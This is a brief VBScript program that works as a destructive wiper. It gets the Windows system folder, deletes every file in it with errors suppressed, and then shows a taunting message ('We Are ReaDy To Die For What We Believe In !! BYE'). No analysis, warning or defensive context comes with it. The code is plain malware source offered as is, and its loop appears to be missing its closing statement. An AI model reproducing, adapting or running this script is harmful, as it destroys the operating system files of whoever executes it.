On Error Resume Next
 Dim daz,zin
Set daz = CreateObject("Scripting.FileSystemObject")
Set zin = daz.getspecialfolder(0)
Set jaz = CreateObject("wscript.shell")
 Set f = daz.GetFolder(Zin)
  Set fc = f.Files
For Each f1 In fc
ZaC= zin&"\"&f1.name
daz.deletefile(zac)
msgbox"We Are ReaDy To Die For What We Believe In !! BYE"
